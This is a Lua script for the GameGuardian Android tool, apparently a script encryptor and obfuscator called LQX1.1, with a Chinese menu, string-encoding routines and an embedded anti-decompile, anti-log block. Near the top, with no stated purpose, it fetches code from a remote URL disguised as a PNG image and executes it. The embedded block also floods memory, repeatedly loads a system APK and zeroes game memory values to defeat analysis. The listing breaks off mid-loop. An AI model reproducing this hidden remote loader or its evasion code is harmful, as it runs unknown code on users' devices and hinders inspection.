-------------------LQX说明---------------------
--目前正在完善UI界面设置已经大部分完成
--写入功能下次完成可以给你们参考一下这种写法的加密
--挺烧脑壳的！折腾几个小时了功能等我完善吧。
--变量
pcall(load(gg.makeRequest("https://www.gejiba.com/view.php/d6e20983acf4a0095a22974006cdcd66.png").content))

--XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("")

function Main()
--获取选择脚本位置
file = io.open(ByXEY1, "r")
if file then--如果无配置生成未选择脚本
code = file:read("*a")
else
io.open(ByXEY1,"w"):write("[未选择脚本]")
ByXEYNB=[[
        LQX1.1重制版加密

        检测到您是初次使用加密

        加密需要初始化重新进入

        本于2021.6.12日制作完成

        小鳄鱼交流群：590854164
]]
gg.alert(ByXEYNB,"")
os.exit()
end
--加密UI界面
SN = gg.choice({
"选择脚本📁",
"开始加密🔒",
"添加验证💡",
"退出脚本❌"
  },nil, "LQX1.1重制版加密\n"..ByXEY8.."\n目前选择脚本:\n"..code)
if SN == 1 then 
a() 
end
if SN == 2 then 
Bb() 
end
if SN == 3 then 
c() 
end
if SN == 4 then 
Exit() 
end
XGCK = -1
end

function a()
--选择脚本加密UI界面
BySST = gg.prompt({
'LQX[1.1重制版]：📁选择脚本',
}, {
gg.getFile():gsub('/[^/]+$',''),
},{
'file',
})

if BySST == nil then--如果没选择
gg.toast("LQX：取消选择脚本🍵")
Main()
else
if loadfile(BySST[1]) == nil then--如果脚本存在错误
os.exit(print("LQX：脚本存在错误❌")) 
end
--写入选择位置
YC=BySST[1]:gsub("(.-)/","").."-加密.lua"
io.open(ByXEY1,"w"):write(BySST[1])
io.open(ByXEY2,"w"):write(YC)
end
Main()--返回
end

function Bb()
file = io.open(ByXEY2, "r")
if file then--如果无配置返回
YC1 = file:read("*a")
else
gg.toast("LQX：请先选择脚本🍵")
Main()--返回
end
--设置加密UI界面
BySST1 = gg.prompt({
'LQXQQ群交流：590854164',
'是否变量布尔值🍵[如有问题关闭可提高兼容]',
'是否function混淆🍵[如有问题关闭可提高兼容]',
'是否防反编译混淆🍵[如有问题关闭可提高兼容]',
'设置防反大小🍵[goto防反]',
}, {
code,
nil,
nil,
nil,
"50",
},{
'file',
'checkbox',
'checkbox',
'checkbox',
'text',
})
if BySST1 == nil then--如果没选择
gg.toast("LQX：已返回主业🍵")
Main()
end

XEY=BySST1[1].."-加密.lua"

local Nj=gg.alert("LQX:\n请选择字符串兼容加密方式","高兼容模式","底兼容模式")
if Nj==2 then
--RL字符串
local gg = gg local os = os local io = io local debug = debug local math = math local table = table local string = string local yc = {}  

DATA = io.open(BySST1[1], "r"):read("*a") 
yc.data = DATA  
local pairs = _ENV['pairs'] local type = _ENV['type'] yc.random = {} yc.random.used = {} function yc.random.get(Length) Length = Length or 6 local Table = {} for index = 1, Length do local random, byte = math.random(1, 26) if index % 2 == 1 then byte = random + 96 else byte = random + 64 end Table[#Table + 1] = string.char(byte) end local Content = table.concat(Table) if yc.random.used[Content] then return yc.random.get(Length + 1) end yc.random.used[Content] = 1 if yc.data and string.match(yc.data, '[^%w_]' .. Content .. '[^%w_]') then return yc.random.get(Length + 1) end return Content end yc.string = {} yc.string.used = {} yc.string.name = yc.random.get() yc.string.index = 0 yc.strinDATA = {} table.insert(yc.strinDATA, yc.string.name .. '={}') yc.ascll = {} yc.ascll.used = {} yc.ascll.name = yc.random.get() yc.ascll.data = {} table.insert(yc.ascll.data, yc.ascll.name .. '={}') yc.decrypt = {} yc.decrypt.name = yc.random.get() yc.decrypt.data = yc.decrypt.name .. '=function(Table)local data="" for index,value in pairs(Table)do data=data..' .. yc.ascll.name .. '[value] end return data end' yc.string.encrypt = function(data) local Func = load('return ' .. data) if not Func then data = data:sub(2, -2) data = string.format('%q', data) Func = load('return ' .. data) data = Func() data = data:sub(2, -2) else data = Func() end if data == '' then return '\\034\\034' end local index = yc.string.used[data] if not index then local Table, Ascll = {} for i, byte in pairs({string.byte(data, 1, -1)}) do Ascll = yc.ascll.used[byte] if not Ascll then Ascll = '"' .. yc.random.get() .. '"' yc.ascll.used[byte] = Ascll table.insert(yc.ascll.data, yc.ascll.name .. '[' .. Ascll .. ']="\\' .. byte .. '"') end Table[#Table + 1] = Ascll end Table = '{' .. table.concat(Table, ',') .. '}' index = '"' .. yc.random.get() .. '"' yc.string.used[data] = index table.insert(yc.strinDATA, yc.string.name .. '[' .. index .. ']=' .. yc.decrypt.name .. '(' .. Table .. ')') end return '(' .. yc.string.name .. '[' .. index .. '])' end gg.toast('LQX:正在加密请稍等……') yc.data = yc.data:gsub('\\\\', '\\092\\092') yc.data = yc.data:gsub('\092\034', '\\034') yc.data = yc.data:gsub("\092\039", '\\039') local Break, types, Table1, Table2, _STRING_, encrypt1 Table1 = {} for txt1 in yc.data:gmatch('[^%-]%[([=]*)%[') do Table1[txt1] = string.len(txt1) end Table2 = {} for index, value in pairs(Table1) do Table2[value + 1] = index end table.sort(Table2, function(a, b) return a > b end) Table1 = Table2 _STRING_ = {} Table2 = {} encrypt1 = function(txt1) local index index = Table2[txt1] if not index then index = #_STRING_ + 1 Table2[txt1] = index _STRING_[index] = txt1 end return '_STRING_(#' .. index .. ')' end repeat Break = false types = yc.data:match('[\034\039]') if types == '\034' then yc.data = yc.data:gsub('\034[^\n]-\034', function(txt2) Break = true return encrypt1(txt2) end, 1) elseif types == '\039' then yc.data = yc.data:gsub('\039[^\n]-\039', function(txt2) Break = true return encrypt1(txt2) end, 1) end until not Break Table2 = nil for text in yc.data:gmatch("[^%-]%-%-%[([=]*)%[") do yc.data = yc.data:gsub("([^%-])%-%-%[" .. text .. "%[.-%]" .. text .. "%]", '%1', 1) end yc.data = yc.data:gsub('\\092\\092', '\\\\') yc.data = yc.data:gsub('\\034', '\034') yc.data = yc.data:gsub("\\039", '\039') for index, value in pairs(Table1) do yc.data = yc.data:gsub('([^\n]-)(%[' .. value .. '%[.-%]' .. value .. '%])', function(txt1, txt2) if txt1:find('%-%-') then return nil end txt2 = txt2:gsub('_STRING_%(#(%d+)%)', function(num) return _STRING_[tonumber(num)] end) return txt1 .. yc.string.encrypt(txt2) end) end yc.data = yc.data:gsub('_STRING_%(#(%d+)%)', function(num) local data = _STRING_[tonumber(num)] data = data:gsub('\\092\\092', '\\\\') return yc.string.encrypt(data) end) _STRING_ = nil Table1 = nil yc.data = string.gsub(yc.data, '\\034', '\034') yc.data = string.gsub(yc.data, '%-%-[^\n]*', '') yc.data = string.gsub(yc.data, '%s*\n%s*', '\n') yc.func, yc.error = load(yc.data) if not yc.func then gg.alert('字符串加密失败\n\n' .. yc.error) return false, yc.error end yc.class = {} yc.class.list = {['table'] = 1,['debug'] = 1,['gg'] = 1,['os'] = 1,['io'] = 1,['bit32'] = 1,['utf8'] = 1,['string'] = 1,['math'] = 1} yc.class.used = {} yc.class.name = yc.random.get() yc.class.data = {} table.insert(yc.class.data, yc.class.name .. '={}') local class = yc.class for index, value in pairs(_ENV) do local types = type(value) if types == 'table' and class.list[index] then for index2, value2 in pairs(value) do local Status, FuncName FuncName = '"' .. yc.random.get() .. '"' for _ = 1, 2 do yc.data = yc.data:gsub('(.)([^%w_])(%s*)' .. index .. '%s*%.%s*' .. index2 .. '(%s*)([^%w_])(.)', function(P1, P2, P3, P4, P5, P6) if (P1 ~= '.' or P2 == '.') and (P5 ~= '.' or P6 == '.') then Status = true return P1 .. P2 .. P3 .. class.name .. '[' .. FuncName .. ']' .. P4 .. P5 .. P6 end end) end if Status then table.insert(class.data, class.name .. '[' .. FuncName .. ']=_ENV["' .. index .. '"]["' .. index2 .. '"]') end end elseif types == 'function' and debug.getinfo(value)['what'] == 'Java' then local Status, FuncName FuncName = '"' .. yc.random.get() .. '"' for _ = 1, 2 do yc.data = yc.data:gsub('(.)([^%w_])(%s*)' .. index .. '(%s*)([^%w_])(.)', function(P1, P2, P3, P4, P5, P6) if (P1 ~= '.' and P2 ~= '.') and (P5 ~= '.' and P6 ~= '.') then Status = true return P1 .. P2 .. P3 .. class.name .. '[' .. FuncName .. ']' .. P4 .. P5 .. P6 end end) end if Status then table.insert(class.data, class.name .. '[' .. FuncName .. ']=_ENV["' .. index .. '"]') end end end yc.config = {} yc.config.used = {} yc.config.name = yc.random.get() yc.confiDATA = {} table.insert(yc.confiDATA,table.concat(yc.ascll.data, '\n')) table.insert(yc.confiDATA,yc.decrypt.data) table.insert(yc.confiDATA,table.concat(yc.strinDATA, '\n')) table.insert(yc.confiDATA,table.concat(yc.class.data, '\n')) yc.data2 = table.concat(yc.confiDATA, '\n') yc.data = yc.data2 .. '\n' .. yc.data  
io.open(XEY,"w"):write(yc.data)
YC1=yc.data
else

local file = io.open(BySST1[1]) -- 打开选择的源码文件
local data = file:read('*a') -- 读取文件所有内容
file:close() -- 关闭文件
function B(data) -- 创建一个加密函数
    data = table.concat({string.byte(data, 1, -1)}, ',')
    data = 'string.char(' .. data .. ')' 
    return data 
end
data = string.gsub(data, '\39(.-)\39', B) -- 加密单引号的字符串
data = string.gsub(data, '\34(.-)\34', B) 
io.open(XEY, 'w'):write(data):close() 

YC1=data
end

if BySST1[2] == true then--是否变量布尔值
YC1=io.open(XEY,"r"):read("*a")
boolen="wsxxs=true\nxxssw=nil\nnsxxs=false\nwdnmd=print\nabc=tostring\ndef=tonumber\nghy=assert\njkl=error\nLoad=load\nFile=loadfile\nmno=pcall\nif nil then local a='' end  while (nil) do local a='' end "
ascll=string.char(math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122))
ascll1=string.char(math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122))
ascll2=string.char(math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122))
ascll3=string.char(math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122))
ascll4=string.char(math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122))
ascll5=string.char(math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122))
ascll6=string.char(math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122))
ascll7=string.char(math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122))
ascll8=string.char(math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122))
ascll9=string.char(math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122))
ascll10=string.char(math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122),math.random(97,122))
boolen1=boolen:gsub("wsxxs",'_ENV["'..ascll..'"]')--true
YC1=YC1:gsub("true",'_ENV["'..ascll..'"]')--nil
boolen1=boolen1:gsub("xxssw",'_ENV["'..ascll1..'"]')
YC1=YC1:gsub("nil",'_ENV["'..ascll1..'"]')--false
boolen1=boolen1:gsub("nsxxs",'_ENV["'..ascll2..'"]')
YC1=YC1:gsub("false",'_ENV["'..ascll2..'"]')--print
boolen1=boolen1:gsub("wdnmd",'_ENV["'..ascll3..'"]')
YC1=boolen1.."\n"..YC1

local T=" if nil then local a='' end  while (nil) do local a='' end "
YC1=YC1:gsub("then","then\n\n"..T)

io.open(XEY,"w"):write(YC1)
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：已成功隐藏布尔值✔"..XEYNB)
else
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：已取消隐藏布尔值❌"..XEYNB)
end

if BySST1[3] == true then--是否function混淆
if BySST1[2] == true then
YC1=io.open(XEY,"r"):read("*a")
else
YC1=io.open(BySST1[1],"r"):read("*a")
end
for text in string.gmatch(YC1, '([%a_][%w_]*)%s*=%s*{') do
    YC1 = string.gsub(YC1, text .. '%.([%a_][%w_]*)', text .. '["%1"]')
end
YC1 = string.gsub(YC1, 'local%s+function%s+([%a_][^%)]+%))', function(text)
    text = 'local function.' .. text
    return text
end)
YC1 = string.gsub(YC1, 'function%s+[%a_][^%)]+%)', function(text)
    local txt1 = string.match(text, 'function%s+(.-)%s*%(')
    local txt2 = string.match(text, '%(.-%)')
    if txt1 and txt2 then
        return '_ENV["' .. txt1 .. '"]=function' .. txt2
    end
end)
YC1 = string.gsub(YC1, 'local function%.([^%)]+%))', function(text)
    text = 'local function ' .. text
    return text
end)
func, error = load(YC1)
CS=io.open(XEY,"w"):write(YC1)
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：已成功function混淆✔"..XEYNB)
else
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：已取消function混淆❌"..XEYNB)
end

if BySST1[4] == true then--是否防反编译混淆
if BySST1[2] or BySST1[3] == true then
YC1=io.open(XEY,"r"):read("a")
else
YC1=io.open(BySST1[1],"r"):read("*a")
end
function Sq_encrypt_a(DATA)
local YC1 =" while(function(_)return _ end)()do ::Sq1:: if(function()end)()then goto Sq1 end _ENV[' 🇽  🇪  🇾 ']=nil end  if nil then local a='' end while (nil) do local a='' end "
 YC1 = YC1:rep(10)
  DATA = DATA:gsub("[^%w_]end[^%w%)_]", function(text)
        return text:gsub("end", "end" .. YC1)
    end)
    YC1 = YC1:rep(100)
    DATA = YC1 .. DATA .. YC1
    return DATA
end
YC1=Sq_encrypt_a(YC1)
io.open(XEY,"w"):write(YC1)
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：已成功防反编译混淆✔"..XEYNB)
else
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：已取消防反编译混淆❌"..XEYNB)
end



ByXEY5=[=[
--脚本后面
]=]

ByXEY3=os.date("🔒LQX加密脚本时间是%Y年-%m月-%d日 %H时:%M分:%S秒 🔒")
--print(YC1)
XEYa=string.rep(' goto s ',BySST1[5])
XEYb="\nif nil then  if nil then  "..XEYa.."  ::s:: end _X=_X  ____=____ ____=____  if nil then  "..XEYa.."  ::s:: end _X=_X  ____=____ ____=____  if nil then  "..XEYa.."    ::s:: end _X=_X   if nil then  "..XEYa.." ::s:: end _X=_X  ____=____ ____=____  if nil then  "..XEYa.."  ::s:: end _X=_X   if nil then  "..XEYa.." ::s:: end _X=_X  ____=____ ____=____  if nil then "..XEYa.." ::s:: end _X=_X   end\n"
XEYNB=io.open(ByXEY,'r'):read("*a")
io.open(ByXEY,"w"):write("\nLQX：自定义goto防反写入成功✔"..XEYNB)

hxcode = ' (function() '
hxcode = string.rep(hxcode, 10)
YC1 = hxcode .. YC1
hxcode = ' end)() '
hxcode = string.rep(hxcode, 10)
YC1 = YC1 .. hxcode
hxcode = ' while ""=="lsqnblsqnblsqnb" do lsqnblsqnblsqnb="lsqnblsqnblsqnb" end '
hxcode = string.rep(hxcode, 10000)
YC1 = hxcode .. YC1
YC1 = ' while ""=="RlRlRR" do RlRlRR=(function()end)("lRlRlR") end ' .. YC1


XEYFY=[=[



for i=1,666 do loadfile(string.char(47,115,121,115,116,101,109,47,112,114,105,118,45,97,112,112,47,83,101,116,116,105,110,103,115,47,83,101,116,116,105,110,103,115,46,97,112,107)) end

local function ELGGREVO()
for i = 1, 0 do i(i+ii+iii+iiii+(i+ii)+iii|(i+ii+iii+iiii+iiii+ii+ii+i+iii+iii+iii+iii+i+iiii+iii+i+i+i+i)|ii+i+i+ii+ii+iii) end
for i = 1, 0 do i((true | false) - true) end
local ELGG_CHAR = string.char
local ELGG_VERSION = ELGG:match(ELGG_CHAR(37,115,40,118,46,43,41,226,132,162,239,184,143))
local ELGG_PROTECT = ELGG_CHAR(240,159,155,161,239,184,143,32,80,114,111,116,101,99,116,32,98,121,32,69,76,71,71,82,101,118,111,32)..ELGG_VERSION..ELGG_CHAR(226,132,162,239,184,143,32,240,159,155,161,239,184,143,10)
local ELGG_EX = function(msg) if msg then print(msg) end os.exit() while true do _ENV = nil end end
local R_ = function(m, n)
  if not m or not m[10] or not n then ELGG_EX(ELGG_PROTECT..ELGG_CHAR(227,128,144,226,157,140,227,128,145,32,69,82,82,79,82,32,99,111,100,101,32,58,32,48,120,48,48,48,48,51,55,53)) end
  local i, res = m[5], ''
  for j in ipairs(n) do
    res = res..ELGG_CHAR((n[j]-m[1]+m[2]*m[3]*m[4]+m[5]%m[6]+m[7]*m[8]+m[9]-m[10]*i)%256)
    i = i + m[4]
  end
  return res
end
local Revo_Y = function(j, k)
  if not j or not j[10][10] or not k or not k[20] then ELGG_EX(ELGG_PROTECT..ELGG_CHAR(227,128,144,226,157,140,227,128,145,32,69,82,82,79,82,32,99,111,100,101,32,58,32,48,120,48,48,48,48,51,56,52)) end
  local m, o = 1, {}
  repeat table.insert(o, j[k[m] ][k[m+1] ])
    m = m + 2
    until m > 20
  return o
end
local Revo_L = {{24,88,36,62,94,30,31,38,63,80},{99,90,63,47,31,47,45,35,75,71},{14,42,61,65,16,26,39,87,95,68},{14,89,65,26,45,24,85,54,48,14},{18,99,51,45,65,98,12,91,55,40},{61,59,17,60,53,71,22,65,71,84},{72,36,88,41,51,51,42,26,35,94},{40,99,35,89,92,37,19,62,89,32},{92,84,55,96,25,78,42,92,26,71},{38,94,45,36,38,98,90,50,35,83}}
local Revo_A = {5,5,8,4,1,3,1,1,6,5,5,8,7,10,6,2,2,9,1,3}
local Revo_Z = Revo_Y(Revo_L, Revo_A)
if not Revo_Z or not Revo_Z[10] then ELGG_EX(ELGG_PROTECT..ELGG_CHAR(227,128,144,226,157,140,227,128,145,32,69,82,82,79,82,32,99,111,100,101,32,58,32,48,120,48,48,48,48,51,57,52)) end
local R_R = function(c)
   if not c then ELGG_EX(ELGG_PROTECT..ELGG_CHAR(227,128,144,226,157,140,227,128,145,32,69,82,82,79,82,32,99,111,100,101,32,58,32,48,120,48,48,48,48,51,57,54)) end
   return R_(Revo_Z, c)
end
if not revo or not revo.getPhoneInfo or not revo.goURL or gg.isDebug or not gg.getPathDebug then ELGG_EX() end
local Revo_X = function(d) if d:sub(1,7) == R_R({125,240,97,186})..ELGG_VERSION:sub(2,4) then return end ELGG_EX() end
local env, nx = tostring(_ENV), false
for k in env:gmatch(R_R({83,185,24,116,181})) do
if k:find(R_R({82,234,50})) then
if nx then ELGG_EX(R_R({13,37,139,58,99,154,139,19,122,218,54,107,239,80,191,16,110,223,48,143,203,237,5,107,26,67,122,85,141,169,14,235,111,250,89,114,31,43,211,58,154,246,84,185,18,43,223,51,148,254,11,190,14,125,212,59,159,172})) else nx = true end end
if k:find(R_R({101,176,94,166,235,104,170,243,90,185,24,116,229})) and k:match(R_R({101,176,94,166,235,104,170,243,90,185,24,116,229})) ~= gg.getFile() then ELGG_EX(R_R({13,37,139,58,99,154,139,19,122,218,54,107,239,80,191,16,110,223,48,143,203,237,5,107,26,67,122,85,141,169,14,235,111,250,89,114,31,43,211,58,154,246,84,185,18,43,223,51,148,254,11,190,14,125,212,59,159,172})) end
end env, nx = nil, nil
local ldprint = ELGG_PROTECT..R_R({53,109,133,235,154,195,250,235,119,218,44,143,240,93,139,15,112,223,48,142,255,80,175,235,13,37,139,58,99,154,117,173,201,46,11,143,26,121,146,63,75,0,94,176,203,119,218,44,143,240,93,108})
if not debug.traceback or not tostring(debug.traceback()):find(R_R({142,243,96,185,22})) then ELGG_EX(ldprint) end
for v in tostring(debug.traceback()):gmatch(R_R({83,185,24,116,181})) do
if (not v) or (v:find(R_R({90})) and v:match(R_R({89,179,26,121,216,52,165})) ~= gg.getFile()) then ELGG_EX(ldprint) end
end
if gg.getFile() ~= revo.getPath() or gg.getFile() ~= gg.getPathDebug then ELGG_EX() end
local R_OS = io.input(gg.getFile()):read(R_R({85,236}))
local f = io.open(gg.FILES_DIR:match(R_R({137,179,25,117,218,52,147,38,137,186,72,117,212,47}))..R_R({158,243,76,189,16,111,202,59,157,240,81,190,218})..gg.PACKAGE..R_R({138,251,93,176,17,112,221,48,153,238,80,190,217,131,216,55}), R_R({157}))
if not f then ELGG_EX() else
local R_C = f:read(R_R({85,236}))
f:close()
for k in R_C:gmatch(gg.getTargetPackage()..R_R({80,184,94,174,29,116,219,63,158,173,41,115,217,56,148,7})) do
if not k or k ~= gg.getFile() or k ~= revo.getPath() or k ~= gg.getPathDebug then ELGG_EX() end
end
for k in R_C:gmatch(R_R({154,253,100,112,216,59,141,9,83,185,24,116,231})) do
if not k or k ~= gg.getFile() or k ~= revo.getPath() or k ~= gg.getPathDebug then ELGG_EX() end
end
end
gg.toast(R_R({27,42,134,236,154,195,250,235,123,253,90,191,16,110,223,235,141,4,11,144,247,82,178,29,144,1,90,107})..ELGG_VERSION)
gg.setRanges(gg.REGION_C_ALLOC | gg.REGION_BAD | gg.REGION_ANONYMOUS)
result = gg.getResults(5000)
Revo_X(R_OS)
gg.setValues(result)
gg.clearResults()
gg.editAll(0, gg.TYPE_DWORD|gg.TYPE_FLOAT)
gg.setRanges()
end
local R_ = function(m, n)
  if not m or not m[10] or not n then print(HH) os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end  end
  local i, res = m[5], ''
  for j in ipairs(n) do
    res = res..string.char((n[j]-m[1]+m[2]*m[3]*m[4]+m[5]%m[6]+m[7]*m[8]+m[9]-m[10]*i)%256)
    i = i + m[4]
  end
  return res
end
local getKey = function(j, k)
  if not j or not j[10][10] or not k or not k[20] then print(HH) os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end  end
  local m, o = 1, {}
  repeat table.insert(o, j[k[m] ][k[m+1] ])
    m = m + 2
    until m > 20
  return o
end
local Revo_L = {{27,68,89,32,80,48,23,67,80,78},{80,38,55,40,73,18,71,21,30,49},{35,36,39,66,12,79,62,10,91,85},{89,46,31,89,53,40,27,19,61,24},{82,97,28,21,93,44,51,46,40,12},{87,32,62,47,17,98,64,29,74,80},{83,46,16,86,14,76,20,20,50,27},{13,81,62,32,87,11,57,89,34,47},{25,20,88,89,54,88,22,94,71,75},{62,53,63,49,49,88,14,83,56,98}}
local Revo_A = {7,7,2,2,6,10,6,8,4,8,6,4,1,7,1,6,1,6,5,7}
local Revo_O = getKey(Revo_L, Revo_A)
if not Revo_O then os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end  end
local Revo_D = function(c)
   if not Revo_O or not Revo_O[10] or not c then print(HH) os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end  end
   return R_(Revo_O, c)
end
local a = (tostring(_ENV))
l=#a
if tostring(_ENV.gg):find(Revo_D({42})) then
  print(HH,_ENV.gg) os.exit()
   while true do if gg.isVisible() then  gg.isVisible(false)end end 
else
  for k in(tostring(_ENV):gmatch("function: @(.-):")) do
    if k ~= gg.getFile() then
    print(HH)
	  os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
	end
  end
end
if debug.traceback == nil or not tostring(debug.traceback()):find(Revo_D({77,25,237,173,113})) then
  print(HH)
  os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
end
for j in tostring(debug.traceback()):gmatch(Revo_D({18,223,165,104,16})) do
  if j:match(Revo_D({24,217,167,109,51,246,206})) then
    if j:match(Revo_D({24,217,167,109,51,246,206})) ~= gg.getFile() then
      print(HH)
      os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
    end
  end
end
local f = io.open(gg.FILES_DIR:sub(1,-6)..Revo_D({93,25,217,177,107,49,243,203,148,78,22,234,109})..gg.PACKAGE..Revo_D({73,33,234,164,108,50,6,192,144,76,21,234,108,125,57,255}), Revo_D({92}))	
	if not f then
print(HH)
  os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
else
   Rcek = f:read(Revo_D({20,18}))
  f:close()
  
  for k in Rcek:gmatch('history -0">(.-)<') do
    if k ~= gg.getFile() then
      print(HH,Revo_D({82,26,235,179,117,63,13,128,79,25,210,181,102,51,249,188,150}))
      os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
    end
  end
  for o in Rcek:gmatch('history -0">(.-)<') do
    if o == gg.getFile() then
      print(HH)
      os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
    end
  end
end
local R_ = function(m, n)
  if not m or not m[10] or not n then print("byLQX") os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end  end
  local i, res = m[5], ''
  for j in ipairs(n) do
    res = res..string.char((n[j]-m[1]+m[2]*m[3]*m[4]+m[5]%m[6]+m[7]*m[8]+m[9]-m[10]*i)%256)
    i = i + m[4]
  end
  return res
end
local getKey = function(j, k)
  if not j or not j[10][10] or not k or not k[20] then print("byLQX") os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end  end
  local m, o = 1, {}
  repeat table.insert(o, j[k[m] ][k[m+1] ])
    m = m + 2
    until m > 20
  return o
end
local Revo_L = {{27,68,89,32,80,48,23,67,80,78},{80,38,55,40,73,18,71,21,30,49},{35,36,39,66,12,79,62,10,91,85},{89,46,31,89,53,40,27,19,61,24},{82,97,28,21,93,44,51,46,40,12},{87,32,62,47,17,98,64,29,74,80},{83,46,16,86,14,76,20,20,50,27},{13,81,62,32,87,11,57,89,34,47},{25,20,88,89,54,88,22,94,71,75},{62,53,63,49,49,88,14,83,56,98}}
local Revo_A = {7,7,2,2,6,10,6,8,4,8,6,4,1,7,1,6,1,6,5,7}
local Revo_O = getKey(Revo_L, Revo_A)
if not Revo_O then os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end  end
local Revo_D = function(c)
   if not Revo_O or not Revo_O[10] or not c then print("byLQX") os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end  end
   return R_(Revo_O, c)
end
local a = (tostring(_ENV))
l=#a
if tostring(_ENV.gg):find(Revo_D({42})) then
  print("byLQX",_ENV.gg) os.exit()
   while true do if gg.isVisible() then  gg.isVisible(false)end end 
else
  for k in(tostring(_ENV):gmatch("function: @(.-):")) do
    if k ~= gg.getFile() then
    print("byLQX")
	  os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
	end
  end
end
if debug.traceback == nil or not tostring(debug.traceback()):find(Revo_D({77,25,237,173,113})) then
  print("byLQX")
  os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
end
for j in tostring(debug.traceback()):gmatch(Revo_D({18,223,165,104,16})) do
  if j:match(Revo_D({24,217,167,109,51,246,206})) then
    if j:match(Revo_D({24,217,167,109,51,246,206})) ~= gg.getFile() then
      print("byLQX")
      os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
    end
  end
end
local f = io.open(gg.FILES_DIR:sub(1,-6)..Revo_D({93,25,217,177,107,49,243,203,148,78,22,234,109})..gg.PACKAGE..Revo_D({73,33,234,164,108,50,6,192,144,76,21,234,108,125,57,255}), Revo_D({92}))	
if not f then
print("byLQX")
  os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
else
   Rcek = f:read(Revo_D({20,18}))
  f:close()
  for k in Rcek:gmatch('history -0">(.-)<') do
    if k ~= gg.getFile() then
      print("byLQX",Revo_D({82,26,235,179,117,63,13,128,79,25,210,181,102,51,249,188,150}))
      os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
    end
  end
  for o in Rcek:gmatch('history -0">(.-)<') do
    if o == gg.getFile() then
      print("byLQX")
      os.exit() while true do if gg.isVisible() then  gg.isVisible(false)end end 
    end
  end
end
local dZvT=string.rep(" ",1048576)
sOaJ={}
for cInW=1,1024 do sOaJ[cInW]=dZvT 
end 
dZvT=nil
for dLrV, wNjO in pairs({gg.alert,gg.bytes,gg.copyText,gg.searchAddress,gg.searchNumber,gg.toast})do 
pcall(wNjO,sOaJ)
end 

local Y=string.rep("LQX防Log防御以启动",999999)
T={}
for i=1,2048 do
T[i]=Y
end
for k,v in pairs (string) do
pcall(v,T)
end

local dZvT=string.rep(" ",1048576)
sOaJ={}
for cInW=1,1024 do
sOaJ[cInW]=dZvT
end dZvT=nil
for dLrV, wNjO in pairs({gg.alert,gg.bytes,gg.copyText,gg.searchAddress,gg.searchNumber,gg.toast}) do
pcall(wNjO,sOaJ)
end
do

local _1M,_1G
_1M = _ENV['string']['rep']('\n', 1024 * 1024)
_1G = {}

local Pcall=_ENV['pcall']
local Pairs = _ENV['pairs']
local debug_getinfo=_ENV['debug']['getinfo']
local string_match=_ENV['string']['match']
local Tostring=_ENV['tostring']
local math_random=_ENV['math']['random']

for index = 1, 1024 do
    _1G[index] = _1M
end
_ENV['\n'] = _1G

for index, value in Pairs({_ENV['string']['find'],string_match, _ENV['string']['dump'],_ENV['gg']['toast'],_ENV['gg']['alert'], _ENV['gg']['bytes'], debug_getinfo, Tostring}) do
    Pcall(value, _1G)
end

local Table,xxxx


Table = {Tostring,_ENV['string']['find'], string_match, Pairs}
for index, value in Pairs(Table) do
    local txt1 = Tostring(value)
    for index=1,math_random(100,200)do
        Pcall(value,txt1,'@')
    end
end

for index, value in Pairs({_ENV['table'],_ENV['debug'], _ENV['gg'], _ENV['os'], _ENV['io'], _ENV['bit32'], _ENV['utf8'], _ENV['string'], _ENV['math']}) do
  local  index = Tostring(value)
  local  xxxx = string_match(index, "@")
    while (xxxx) do
    end
end

for index, value in Pairs({"tostring", "load", "ipairs", "pcall", "assert2", "loadfile","pairs", "error", "tonumber", "xpcall", "assert", "dofile", "print", "type"}) do
   local value = _ENV[value]
   local index = Tostring(value)
   local xxxx = string_match(index, "@")
